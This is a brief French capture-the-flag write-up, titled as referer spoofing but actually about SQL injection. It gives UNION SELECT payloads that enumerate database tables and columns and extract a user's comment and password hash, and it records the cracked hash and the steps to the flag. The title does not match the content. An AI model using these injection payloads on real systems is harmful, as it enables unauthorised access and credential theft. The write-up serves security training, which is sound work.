# Vulnérabilité de Referer Spoofing (Falsification de Referer)

## Découverte
Quand on tape n'importe quoi ca mets direcement une erreur SQl, ce qui veut dire que le champs est directement insere dans la requete.

1 UNION SELECT table_name, NULL FROM information_schema.tables -- 

```
    1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x7573657273 -- 
```
Lsite les columns de la DB

Tester les differents fields :

```
    1 UNION SELECT Commentaire, NULL FROM 0x7573657273 --
```


1 UNION SELECT countersign, NULL FROM users WHERE user_id=5 --
1 UNION SELECT Commentaire, NULL FROM users WHERE user_id=5 --
1 UNION SELECT country, NULL FROM users WHERE user_id=5 --
1 UNION SELECT town, NULL FROM users WHERE user_id=5 --

1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 -- 
```
ID: 1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 --  
First name: one
Surname : me
ID: 1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 --  
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

On prend la clef comme dit si dessous 128 bits donc hash md5 qui  est egale a FortyTwo 

on encrypte fortytwio en minuscule en .sha256 et ca donne le flag a trouver


## Protection
Il faut verifier si il n'y a pas e SQL dans les requetes si on les inseres apres dans les requetes sql 
